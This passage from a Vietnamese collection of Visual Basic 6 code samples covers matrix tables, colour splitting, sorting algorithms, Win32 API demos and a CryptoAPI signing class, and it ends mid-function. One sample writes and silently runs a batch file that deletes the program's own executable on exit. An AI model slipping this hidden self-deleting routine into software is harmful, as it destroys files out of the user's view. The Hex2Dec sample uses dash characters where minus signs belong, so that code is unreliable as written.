            Next
        Next
 
        For i = 0 To a - 1 ' Ma trân phai
            For j = 0 To b - 1
                k = Text1.Count
                Load Text1(k)
                Text1(k).Top = Text1(0).Top + (i Mod a) * 600
                Text1(k).Left = Text1(0).Left + (j Mod b) * 600 + (b * 600) + 600
                Text1(k).Visible = True
                Text1(k) = Int(Rnd * 10)
            Next
        Next
        
        For i = 0 To a - 1 ' Ma trân kê't qua
            For j = 0 To b - 1
                k = Text1.Count
                Load Text1(k)
                Text1(k).Top = Text1(0).Top + (i Mod a) * 600
                Text1(k).Left = Text1(0).Left + (j Mod b) * 600 + (b * 1200) + 1200
                Text1(k).Visible = True
                bang3 = True
            Next
        Next
    Label3.Left = Label2.Left + (b * 600) + 600
    Label4.Left = Label3.Left + (b * 600) + 600
End If
 
    Me.Width = Text1(k).Left + 800
    Me.Height = Text1(k).Top + 1200
MaTrânCông
End Sub
 
Private Sub XoáText()
Dim Te As Control
    For Each Te In Me.Controls
        If TypeOf Te Is TextBox Then Te.Visible = False
    Next
 ''' KHÔNG CHO HIÊN TEXT1(0)
Text2.Visible = True
Text3.Visible = True
If Text1.Count &gt; 1 Then
    For i = 1 To Text1.Count - 1
        Unload Text1(i)
    Next
End If
End Sub
 
Private Sub MaTrânCông()
If Val(Text2) &gt; 0 And Val(Text3) &gt; 0 Then
    Dim i As Byte, c As Integer
        c = Val(Text2) * Val(Text3)
 
        For i = 1 To c  ' Ma trân +
            Text1(i + 2 * c) = Val(Text1(i)) + Val(Text1(i + c))
        Next
End If
End Sub
 
Private Sub Form_Load()
    TaoBang
End Sub
 
Private Sub Text1_Change(Index As Integer)
If bang3 = False Then
    Exit Sub
Else
    MaTrânCông
End If
End Sub
 
Private Sub Text2_Change()
TaoBang
End Sub
 
Private Sub Text3_Change()
    TaoBang
End Sub
 
Xem thêm Ma Trận Nhân</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090619050650</MaVD>
    <NoiDung>Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Sub Command1_Click()
Text2 = TachMau1(Text1)
Text3 = TachMàu2(Text1)
Text4 = TáchMau3(Text1)
End Sub
Private Function TachMau1(Mau As Long) As String
Dim R As Long, G As Long, B As Long
R = Mau And 255
G = (Mau \ 256) And 255
B = (Mau \ 65536) And 255
TachMau1 = "R: " &amp; R &amp; " G: " &amp; G &amp; " B: " &amp; B
End Function
 
Private Function TachMàu2(Mau As Long) As String
Dim red As Long, green As Long, blue As Long
red = Mau And &amp;HFF
green = (Mau And &amp;HFF00&amp;) \ &amp;H100&amp;
blue = (Mau And &amp;HFF0000) \ &amp;H10000
TachMàu2 = "R: " &amp; CStr(red) &amp; " G: " &amp; CStr(green) &amp; " B: " &amp; CStr(blue)
End Function
Private Function TáchMau3(Mau As Long) As String
Dim m(2) As Byte
CopyMemory m(0), Mau, 3
TáchMau3 = "R: " &amp; m(0) &amp; " G: " &amp; m(1) &amp; " B: " &amp; m(2)
End Function

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091119051140</MaVD>
    <NoiDung>Sub AlterArray(DestArray() As Byte, ParamArray Values() As Variant)
    'Chỉnh lại độ lớn của mảng
    ReDim DestArray(UBound(Values))
    Dim i As Integer
    'Gán các giá trị
    For i = 0 To UBound(Values)
        DestArray(i) = CByte(Values(i))
    Next
End Sub

Sử dụng:

Dim MyArray() As Byte
AlterArray MyArray, 0, 1, 2, 3, 4 'Muốn bao nhiêu giá trị cũng được

Lưu ý:
1. Ở đây ví dụ xài kiểu Byte, có thể dùng kiểu dữ liệu khác.
2. Tham số thứ nhứt của hàm AlterArray là tên mảng cần gán giá trị, tiếp theo là các giá trị, bắt đầu từ phần tử 0.
3. Có thể sửa lại để gán từ phần tử khác 0, cái này để dành cho chư vị tìm hiểu</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091319051326</MaVD>
    <NoiDung>Private Sub Form_Terminate()
    Dim myEXE, outEX As String
    myEXE = App.Path &amp; "\" &amp; App.EXEName &amp; ".exe"
    mybat = App.Path &amp; "\go.bat"
    Open mybat For Output As #1
    Print #1, "del " &amp; App.EXEName &amp; ".exe"
    Print #1, "del go.bat"
    Close #1
    Shell mybat, vbHide
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091419051452</MaVD>
    <NoiDung>Module:

Public ViThu() As Integer
Public SapXep As New Collection
 
Public Sub SapDiem(ByVal HoSo As Variant)
Dim i%, j%, k As Boolean
    For i = 1 To UBound(HoSo)
        If i &gt; 1 Then
            For j = 1 To SapXep.Count
                If HoSo(i) &gt; SapXep(j) Then
                    SapXep.Add HoSo(i), , j
                    k = True
                    Exit For
                End If
            Next
            If k = False Then SapXep.Add HoSo(i)
            k = False
        Else
            SapXep.Add HoSo(i)
        End If
    Next
    Call SapViThu(HoSo)
End Sub
 
Public Sub SapViThu(ByVal HoSo As Variant)
Dim i%, j%
ReDim ViThu(1 To UBound(HoSo))
    For i = 1 To UBound(HoSo)
        If i &gt; 1 Then
            If SapXep(i) = SapXep(i - 1) Then
                ViThu(i) = j
            Else
                ViThu(i) = i
                j = i
            End If
        Else
            ViThu(i) = i
            j = i
        End If
    Next
End Sub
 
Form:

Private Sub Command1_Click()
Dim Mang() As Single
ReDim Mang(1 To List1.ListCount)
 
For i = 1 To List1.ListCount
    Mang(i) = List1.List(i - 1)
Next
SapDiem (Mang)
 
For i = 1 To List1.ListCount
    List1.List(i - 1) = SapXep(i) &amp; vbTab &amp; ViThu(i)
Next
End Sub
 
Private Sub Form_Load()
Randomize
For i = 1 To 50
    List1.AddItem Format(Rnd * 10, "0.0")
Next
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091619051634</MaVD>
    <NoiDung>Cần List1

' References Microsft DAO 3.6
Private Sub ListTableDef(ByVal dbName As String)
    If Dir$(dbName) = "" Then Exit Sub
    Dim db As Database, tb As TableDef
    Set db = OpenDatabase(dbName)
    For Each tb In db.TableDefs
        If Left(tb.Name, 4) &lt;&gt; "MSys" Then List1.AddItem tb.Name
    Next tb
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092119052120</MaVD>
    <NoiDung>Function Hex2Dec(ByVal strHex As String) As Integer
    'Chuỗi các giá trị hợp lệ của hệ đếm thập lục phân
    Const Base16 = "0123456789ABCDEF"
    'Đổi về chữ in để phù hợp với chuỗi Base16
    strHex = UCase(strHex)
    Dim i As Integer, result As Integer, tmp As String
    For i = 1 To Len(strHex)
        tmp = Mid(strHex, i, 1)
        'Trái tim của thuật toán là ở đây
        result = result + (InStr(1, Base16, tmp) – 1) _
            * (16 ^ (Len(strHex) – i))
    Next
    'Trả về kết quả
    Hex2Dec = result
End Function

Sử dụng:

Dim h As String, i As Integer
h = "6F"
i = Hex2Dec(h)
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092419052428</MaVD>
    <NoiDung>Nếu bạn nhấn Cancel khi hiện InputBox, VB trả về vbNullString, còn khi nhấn OK mà không nhập gì, giá trị trả về là "". Tuy nhiên VB lại xem vbNullString tương đương "" mặc dù nó hoàn toàn khác nhau.
Vậy nhiệm vụ của chúng ta là tách nó ra. Và ta sẽ dùng con trỏ!

Dim strInput As String
 
strInput = InputBox("Nhap vao gi do di!")
 
If StrPtr(strInput) = 0 Then
    MsgBox "Da nhan Cancel"
End If
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092719052744</MaVD>
    <NoiDung>Chỉ việc tạo project mới rồi thêm vào 2 Command Button, set Index của Command1 là 0. Copy code dán vào rồi F5

Const MIN = 21, MAX = 30
 
Private Enum sortType
    BUBBLE
    BIBUBBLE
    INSERTION
    SHELLS
    SELECTION
    BISELECTION
    QUICK
    HEAP
End Enum
 
Dim Last1%
Dim sortarray() As Integer
 
Private Sub Bubble_Sort()
    Dim j%, last%, tmp%, Done As Boolean
    
    last = Last1 - 1
    
    Do While Not Done
        Done = True
        
        For j = 0 To last
            'Just this line is changed
            If sortarray(j) &lt; sortarray(j + 1) Then
                tmp = sortarray(j)
                sortarray(j) = sortarray(j + 1)
                sortarray(j + 1) = tmp
                
                Done = False
            End If
        Next
        
        last = last - 1
    Loop
End Sub
 
 
Private Sub BiBubble_Sort()
    Dim j%, first%, last%, tmp%, Done As Boolean
        
    last = Last1 - 1
    Do While Not Done
        Done = True
        For j = first To last
            'This line is changed
            If sortarray(j) &lt; sortarray(j + 1) Then
                tmp = sortarray(j)
                sortarray(j) = sortarray(j + 1)
                sortarray(j + 1) = tmp
                Done = False
            End If
        Next
        
        If Done Then Exit Do
        first = first + 1
        
        For j = last To first Step -1
            'This line is changed
            If sortarray(j) &gt; sortarray(j - 1) Then
                tmp = sortarray(j)
                sortarray(j) = sortarray(j - 1)
                sortarray(j - 1) = tmp
                Done = False
            End If
        Next
        
        last = last - 1
    Loop
End Sub
 
Private Sub Insertion_Sort()
    Dim j%, low%, high%, tmp%
    
    For j = 1 To Last1
        high = j
        Do
            low = high - 1
            'This line is changed
            If sortarray(low) &lt; sortarray(high) Then
                tmp = sortarray(low)
                sortarray(low) = sortarray(high)
                sortarray(high) = tmp
                
                high = low
            Else
                Exit Do
            End If
        Loop Until high &lt;= 0
    Next
End Sub
 
Private Sub Insertion_Shuffle_Sort()
    Dim j%, low%, high%, tmp%
    
    For j = 1 To Last1
        high = j
        tmp = sortarray(high)
 
        Do
            low = high - 1
            'This line is changed
            If sortarray(low) &gt;= tmp Then Exit Do
            sortarray(high) = sortarray(low)
            high = low
        Loop Until high &lt;= 0
 
        sortarray(high) = tmp
    Next
End Sub
 
Private Sub Shell_Sort()
    Dim diff%, low%, high%, tmp%
    
    diff = Last1 \ 2
    
    Do While diff
        high = diff
        
        Do Until high &gt; Last1
            low = high - diff
            'This line is changed
            If sortarray(low) &lt; sortarray(high) Then
                tmp = sortarray(low)
                sortarray(low) = sortarray(high)
                sortarray(high) = tmp
                
                If diff = 1 Then
                    If low &gt; 0 Then high = low - 1
                End If
            End If
            
            high = high + 1
        Loop
        
        diff = Int(CSng(diff) / 1.3)
    Loop
End Sub
 
Private Sub Selection_Sort()
    Dim j%, tmp%, low%, lower%
    
    Do Until lower &gt;= Last1
        low = lower
                
        For j = lower + 1 To Last1
            'This line is changed
            If sortarray(j) &gt; sortarray(low) Then low = j
        Next
        
        If low &lt;&gt; lower Then
            tmp = sortarray(lower)
            sortarray(lower) = sortarray(low)
            sortarray(low) = tmp
        End If
        
        lower = lower + 1
    Loop
End Sub
 
Private Sub BiSelection_Sort()
    Dim j%, low%, high%, lower%, upper%, tmp%
    
    upper = Last1
    
    Do Until lower &gt;= upper
        high = upper
        low = lower
                
        For j = lower To upper
            'This line is changed
            If sortarray(j) &gt; sortarray(low) Then
                low = j
            'This line is changed
            ElseIf sortarray(j) &lt; sortarray(high) Then
                high = j
            End If
        Next
        
        If high &lt;&gt; upper Then
            If low = upper Then low = high
            tmp = sortarray(upper)
            sortarray(upper) = sortarray(high)
            sortarray(high) = tmp
        End If
        
        If low &lt;&gt; lower Then
            tmp = sortarray(lower)
            sortarray(lower) = sortarray(low)
            sortarray(low) = tmp
        End If
        
        lower = lower + 1
        upper = upper - 1
    Loop
End Sub
 
Private Sub Quick_Sort(ByVal lower%, ByVal upper%)
    If lower &gt;= upper Then Exit Sub
    
    Dim low%, midl%, high%, midval%, tmp%
    
    low = lower
    high = upper
    
    midl = lower + (upper - lower) \ 2
    midval = sortarray(midl)
 
    Do While low &lt;= high
        Do Until low &gt;= upper
            'This line is changed
            If sortarray(low) &lt;= midval Then Exit Do
            low = low + 1
        Loop
     
        Do Until high &lt;= lower
            'This line is changed
            If midval &lt;= sortarray(high) Then Exit Do
            high = high - 1
        Loop
 
        If low &lt;= high Then
            If low &lt; high Then
                tmp = sortarray(low)
                sortarray(low) = sortarray(high)
                sortarray(high) = tmp
            End If
            low = low + 1
            high = high - 1
        End If
    Loop
 
    If lower &lt; high Then Quick_Sort lower, high
    If low &lt; upper Then Quick_Sort low, upper
End Sub
 
Private Sub Heap_Sort()
    Dim j%, tmp%
 
    j = Last1 - Last1 \ 2
    
    Do Until j &gt;= Last1
        SiftUp Last1, j, 0
        j = j + 1
    Loop
 
    For j = 0 To Last1 - 1
        'This line is changed
        If sortarray(Last1) &gt; sortarray(j) Then
            tmp = sortarray(Last1)
            sortarray(Last1) = sortarray(j)
            sortarray(j) = tmp
            
            SiftUp Last1, Last1 - 1, j
        End If
    Next
End Sub
Private Sub SiftUp(first%, ByVal midl%, last%)
    Dim k%, k1%, m1%, tmp%
    
    k = (midl - first) * 2 + first
    Do While k &gt;= last
        If k &gt; last Then
            k1 = k + 1
            'This line is changed
            If sortarray(k) &gt; sortarray(k1) Then
                k = k - 1
            End If
        End If
        
        k1 = k + 1
        m1 = midl + 1
        'This line is changed
        If sortarray(k1) &gt; sortarray(m1) Then
            tmp = sortarray(k1)
            sortarray(k1) = sortarray(m1)
            sortarray(m1) = tmp
        Else
            Exit Do
        End If
        midl = k
        k = (midl - first) * 2 + first
    Loop
End Sub
 
Private Sub Command1_Click(Index As Integer)
    Caption = Command1(Index).Caption
    
    Select Case Index
        Case BUBBLE: Bubble_Sort
        Case BIBUBBLE: BiBubble_Sort
        Case SHELLS: Shell_Sort
        Case INSERTION: Insertion_Sort
        Case SELECTION: Selection_Sort
        Case BISELECTION: BiSelection_Sort
        Case QUICK: Quick_Sort 0, Last1
        Case HEAP: Heap_Sort
    End Select
    
    ShowArray
End Sub
 
Private Sub Command2_Click()
    Dim j%, k%
    Dim c As New Collection
    
    Randomize
    Last1 = MAX - MIN
    ReDim sortarray(Last1)
    
    For j = MIN To MAX
        c.Add j
    Next
    
    Do While c.Count &gt; 0
        j = Int(c.Count * Rnd) + 1
        sortarray(k) = CInt(c.Item(j))
        c.Remove j
        k = k + 1
    Loop
    
    Caption = "Descend Sorting"
    ShowArray
End Sub
 
Private Sub ShowArray()
    Dim j%
    
    Cls
    For j = 0 To Last1
         Print sortarray(j)
    Next
End Sub
 
Private Sub Form_Load()
    Const MARGIN = 200, HGHT = 300, WDTH = 1800
    Dim j%, lt!, tp!
    
    Move 1000, 1000, 4800, 3600
    tp = MARGIN
    lt = Width - (WDTH + MARGIN) * 2
    
    For j = 0 To 7
        If j Then Load Command1(j)
        
        With Command1(j)
            .Move lt, tp, WDTH, HGHT
            '.FontBold = True
            Select Case j
                Case BUBBLE: .Caption = "Bubble Sort"
                Case BIBUBBLE: .Caption = "BiBubble Sort"
                Case INSERTION: .Caption = "Insertion Sort"
                Case SHELLS: .Caption = "Shell Sort"
                Case SELECTION: .Caption = "Selection Sort"
                Case BISELECTION: .Caption = "BiSelection Sort"
                Case QUICK: .Caption = "Quick Sort"
                Case HEAP: .Caption = "Heap Sort"
            End Select
            .Visible = True
        End With
        
        If j = 3 Then
            lt = lt + MARGIN + WDTH
            tp = MARGIN
        Else
            tp = tp + HGHT + MARGIN
        End If
    Next
    
    lt = lt - MARGIN - WDTH
    With Command2
        .Move lt, tp, WDTH * 2 + MARGIN, HGHT
        .FontBold = True
        .Caption = "Randomize"
    End With
    
    FontBold = True
    AutoRedraw = True
    Command2_Click
End Sub
 
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095019085014</MaVD>
    <NoiDung>
Private Type WNDCLASS
    style As Long
    lpfnwndproc As Long
    cbClsextra As Long
    cbWndExtra2 As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
End Type
Private Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long
Private Declare Function GetClassInfo Lib "user32" Alias "GetClassInfoA" (ByVal hInstance As Long, ByVal lpClassName As String, lpWndClass As WNDCLASS) As Long
Private Sub Form_Paint()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim WC As WNDCLASS
    'Get class info
    GetClassInfo ByVal 0&amp;, "BUTTON", WC
    'Clear the form
    Me.Cls
    'Print the retrieved information to the form
    Me.Print "The button's default background is set to color-number:" + Str$(GetSysColor(WC.hbrBackground))
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095319085321</MaVD>
    <NoiDung>Private Type WNDCLASSEX
    cbSize As Long
    style As Long
    lpfnWndProc As Long
    cbClsExtra As Long
    cbWndExtra As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
    hIconSm As Long
End Type
Private Declare Function DrawIcon Lib "user32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal hIcon As Long) As Long
Private Declare Function GetClassInfoEx Lib "user32" Alias "GetClassInfoExA" (ByVal hInstance As Long, ByVal lpClassName As String, lpWndClass As WNDCLASSEX) As Long
Private Sub Form_Paint()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim WCX As WNDCLASSEX
    'Set the structure size
    WCX.cbSize = Len(WCX)
    'Get the class info
    GetClassInfoEx ByVal 0&amp;, "EDIT", WCX
    'Clear the screen
    Me.Cls
    Me.Print "This is the default cursor for a textbox:"
    'Draw the default cursor on the form
    DrawIcon Me.hdc, 0, 15, WCX.hCursor
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095719085758</MaVD>
    <NoiDung>' This code is licensed according to the terms and conditions listed here.
' http://www.hep.wisc.edu/~pinghc/books/apirefeng/g/getclasslong.html


' Declarations and such needed for the example:
' (Copy them to the (declarations) section of a module.)
Public Declare Function GetClassLong Lib "user32.dll" Alias "GetClassLongA" (ByVal hWnd As Long, _
	ByVal nIndex As Long) As Long
Public Const GCL_HICON = -14
Public Declare Function DrawIcon Lib "user32.dll" (ByVal hDC As Long, ByVal x As Long, ByVal y _
	As Long, ByVal hIcon As Long) As Long



' Place the following code inside a form window. ***

Private Sub Command1_Click ()
	Dim hIcon As Long   ' handle to the class's icon
	Dim retval As Long  ' return value
	
	' Retrieve a handle to the class's icon.
	hIcon = GetClassLong(Me.hWnd, GCL_HICON)
	' Draw that icon at coordinate (0,0) on Form1.
	retval = DrawIcon(Me.hDC, 0, 0, hIcon)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090719090732</MaVD>
    <NoiDung>Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim sSave As String, Cnt As Long, T As Long, Pos As Long, Length As Long
    Const mStr = "Hello "
    Length = Len(mStr)
    sSave = Space(5000 * Length) 'make buffer for justified comparison
    'Get the current tickcount
    T = GetTickCount
    Pos = 1
    sSave = Space(5000 * Length)
    For Cnt = 1 To 5000
      Mid(sSave, Pos, Length) = mStr
      Pos = Pos + Length
    Next Cnt
    'Show the results
    MsgBox "It took Visual basic" + Str$(GetTickCount - T) + " msecs. to add 5000 times a string to itself."
    'Get the current tickcount
    T = GetTickCount
    Pos = 0
    sSave = Space(5000 * Length)
    For Cnt = 1 To 5000
        CopyMemory ByVal StrPtr(sSave) + Pos, ByVal StrPtr(mStr), LenB(mStr)
        Pos = Pos + LenB(mStr)
    Next Cnt
    'Show the results
    MsgBox "It took CopyMemory" + Str$(GetTickCount - T) + " msecs. to add 5000 times a string to itself."
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091219091209</MaVD>
    <NoiDung>Private Type BrowseInfo
    hWndOwner As Long
    pIDLRoot As Long
    pszDisplayName As Long
    lpszTitle As Long
    ulFlags As Long
    lpfnCallback As Long
    lParam As Long
    iImage As Long
End Type
Const BIF_RETURNONLYFSDIRS = 1
Const MAX_PATH = 260
Private Declare Sub CoTaskMemFree Lib "ole32.dll" (ByVal hMem As Long)
Private Declare Function lstrcat Lib "kernel32" Alias "lstrcatA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
Private Declare Function SHBrowseForFolder Lib "shell32" (lpbi As BrowseInfo) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'KPDTeam@Allapi.net
    Dim iNull As Integer, lpIDList As Long, lResult As Long
    Dim sPath As String, udtBI As BrowseInfo

    With udtBI
        'Set the owner window
        .hWndOwner = Me.hWnd
        'lstrcat appends the two strings and returns the memory address
        .lpszTitle = lstrcat("C:\", "")
        'Return only if the user selected a directory
        .ulFlags = BIF_RETURNONLYFSDIRS
    End With

    'Show the 'Browse for folder' dialog
    lpIDList = SHBrowseForFolder(udtBI)
    If lpIDList Then
        sPath = String$(MAX_PATH, 0)
        'Get the path from the IDList
        SHGetPathFromIDList lpIDList, sPath
        'free the block of memory
        CoTaskMemFree lpIDList
        iNull = InStr(sPath, vbNullChar)
        If iNull Then
            sPath = Left$(sPath, iNull - 1)
        End If
    End If

    MsgBox sPath
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091419091445</MaVD>
    <NoiDung>Private Declare Sub FillMemory Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Private Declare Sub ZeroMemory Lib "kernel32.dll" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As Long)
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim TestString As String
    'Mak sure Visual Basic repaint the form automatically
    Me.AutoRedraw = True
    'Create a buffer string
    TestString = String(25, "X")
    Me.Print "This is our initial string: " + TestString
    'Fill the buffer-string with A's
    FillMemory ByVal TestString, Len(TestString), Asc("A")
    Me.Print "This is our string after FillMemory: " + TestString
    'Empty the string
    ZeroMemory ByVal TestString, Len(TestString)
    Me.Print "This is our string after ZeroMemory: " + TestString
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091719091743</MaVD>
    <NoiDung>Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim sSave As String, Ret As Long
    'Create a buffer
    sSave = Space(255)
    'Get the system directory
    Ret = GetSystemDirectory(sSave, 255)
    'Remove all unnecessary chr$(0)'s
    sSave = Left$(sSave, Ret)
    'Show the windows directory
    MsgBox "Windows System directory: " + sSave
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091919091938</MaVD>
    <NoiDung>'Paste this code in a Class Module, named clsCryptoFilterBox

Option Explicit
Private Declare Function CryptAcquireContext Lib "advapi32.dll" Alias "CryptAcquireContextA" (phProv As Long, pszContainer As String, pszProvider As String, ByVal dwProvType As Long, ByVal dwFlags As Long) As Long
Private Declare Function CryptCreateHash Lib "advapi32.dll" (ByVal hProv As Long, ByVal Algid As Long, ByVal hKey As Long, ByVal dwFlags As Long, phHash As Long) As Long
Private Declare Function CryptDeriveKey Lib "advapi32.dll" (ByVal hProv As Long, ByVal Algid As Long, ByVal hBaseData As Long, ByVal dwFlags As Long, phKey As Long) As Long
Private Declare Function CryptDestroyHash Lib "advapi32.dll" (ByVal hHash As Long) As Long
Private Declare Function CryptDestroyKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function CryptEncrypt Lib "advapi32.dll" (ByVal hKey As Long, ByVal hHash As Long, ByVal Final As Long, ByVal dwFlags As Long, ByVal pbData As String, pdwDataLen As Long, ByVal dwBufLen As Long) As Long
Private Declare Function CryptDecrypt Lib "advapi32.dll" (ByVal hKey As Long, ByVal hHash As Long, ByVal Final As Long, ByVal dwFlags As Long, ByVal pbData As String, pdwDataLen As Long) As Long
Private Declare Function CryptExportKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal hExpKey As Long, ByVal dwBlobType As Long, ByVal dwFlags As Long, ByVal pbData As String, pdwDataLen As Long) As Long
Private Declare Function CryptGenKey Lib "advapi32.dll" (ByVal hProv As Long, ByVal Algid As Long, ByVal dwFlags As Long, phKey As Long) As Long
Private Declare Function CryptGetProvParam Lib "advapi32.dll" (ByVal hProv As Long, ByVal dwParam As Long, pbData As Any, pdwDataLen As Long, ByVal dwFlags As Long) As Long
Private Declare Function CryptGetUserKey Lib "advapi32.dll" (ByVal hProv As Long, ByVal dwKeySpec As Long, phUserKey As Long) As Long
Private Declare Function CryptHashData Lib "advapi32.dll" (ByVal hHash As Long, ByVal pbData As String, ByVal dwDataLen As Long, ByVal dwFlags As Long) As Long
Private Declare Function CryptReleaseContext Lib "advapi32.dll" (ByVal hProv As Long, ByVal dwFlags As Long) As Long
Private Declare Function CryptSignHash Lib "advapi32.dll" Alias "CryptSignHashA" (ByVal hHash As Long, ByVal dwKeySpec As Long, ByVal sDescription As String, ByVal dwFlags As Long, ByVal pbSignature As String, pdwSigLen As Long) As Long
Private Declare Function CryptVerifySignature Lib "advapi32.dll" Alias "CryptVerifySignatureA" (ByVal hHash As Long, ByVal pbSignature As String, ByVal dwSigLen As Long, ByVal hPubKey As Long, ByVal sDescription As String, ByVal dwFlags As Long) As Long

'API error function
Private Declare Function GetLastError Lib "kernel32" () As Long

'API memory functions
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Sub CpyMemValAdrFromRefAdr Lib "kernel32" Alias "RtlMoveMemory" (ByVal hpvDest As Any, hpvSource As Any, ByVal cbCopy As Long)
Private Declare Sub CpyMemRefAdrFromValAdr Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, ByVal hpvSource As Any, ByVal cbCopy As Long)

'constants for API memory functions
Private Const GMEM_MOVEABLE = &amp;H2
Private Const GMEM_ZEROINIT = &amp;H40
Private Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)

'constants for Cryptography API functions
Private Const MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0"
Private Const PROV_RSA_FULL = 1
Private Const CRYPT_NEWKEYSET = &amp;H8
Private Const PP_CONTAINER = 6
Private Const AT_KEYEXCHANGE = 1
Private Const AT_SIGNATURE = 2

Private Const SIMPLEBLOB = 1

Private Const ALG_CLASS_DATA_ENCRYPT = 24576
Private Const ALG_CLASS_HASH = 32768
Private Const ALG_TYPE_ANY = 0
Private Const ALG_TYPE_BLOCK = 1536
Private Const ALG_TYPE_STREAM = 2048
Private Const ALG_SID_RC2 = 2
Private Const ALG_SID_RC4 = 1
Private Const ALG_SID_MD5 = 3

Private Const CALG_MD5 = ((ALG_CLASS_HASH Or ALG_TYPE_ANY) Or ALG_SID_MD5)
Private Const CALG_RC2 = ((ALG_CLASS_DATA_ENCRYPT Or ALG_TYPE_BLOCK) Or ALG_SID_RC2)
Private Const CALG_RC4 = ((ALG_CLASS_DATA_ENCRYPT Or ALG_TYPE_STREAM) Or ALG_SID_RC4)

'constants from WinErr.h
Private Const NTE_NO_KEY As Long = -2146893811  '0x8009000DL
Private Const NTE_BAD_SIGNATURE As Long = -2146893818

'clsCryptoFilterBox constants
Private Const CFB_BUSY = 0
Private Const CFB_READY = 1
Private Const CFB_VALID = 2

Private Const ENCRYPT_ALGORITHM = CALG_RC4
Private Const ENCRYPT_BLOCK_SIZE = 1

Private Const CRYPT_EXPORTABLE = 1

'private property buffers
Private sInBuffer As String
Private sOutBuffer As String
Private sPassword As String
Private sSignature As String
Private lStatus As Long
Public Property Get InBuffer() As String
    InBuffer = sInBuffer
End Property
Public Property Let InBuffer(vNewValue As String)
    sInBuffer = vNewValue
End Property
Public Property Get OutBuffer() As String
    OutBuffer = sOutBuffer
End Property
Public Property Get Signature() As String
    Signature = sSignature
End Property
Public Property Let Signature(vNewValue As String)
    sSignature = vNewValue
End Property
Public Sub Sign()
'Create a signature for Inbuffer and place in Signature

Dim sContainer As String, sDescription As String, sProvider As String, lHCryptprov As Long
Dim lHHash As Long, lResult As Long, lSignatureLen As Long

On Error GoTo ErrSign

'switch Status property
lStatus = CFB_BUSY

'init Signature property
sSignature = ""

'Get handle to the default provider.
sContainer = vbNullChar
sProvider = MS_DEF_PROV &amp; vbNullChar
If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptAcquireContext!")
    GoTo ReleaseHandles:
End If

'Create a hash object.
If Not CBool(CryptCreateHash(lHCryptprov, CALG_MD5, 0, 0, lHHash)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptCreateHash!")
    GoTo ReleaseHandles:
End If

If Not CBool(CryptHashData(lHHash, sInBuffer, Len(sInBuffer), 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptHashData!")
    GoTo ReleaseHandles:
End If

'Sign hash object.
'Determine size of signature.
sDescription = vbNullChar
lResult = CryptSignHash(lHHash, AT_SIGNATURE, sDescription, 0, sSignature, lSignatureLen)

sSignature = String(lSignatureLen, vbNullChar)

'Sign hash object (with signature key).
If Not CBool(CryptSignHash(lHHash, AT_SIGNATURE, sDescription, 0, sSignature, lSignatureLen)) Then
    MsgBox ("Error " &amp; CStr(GetLastError()) &amp; " during CryptSignHash")
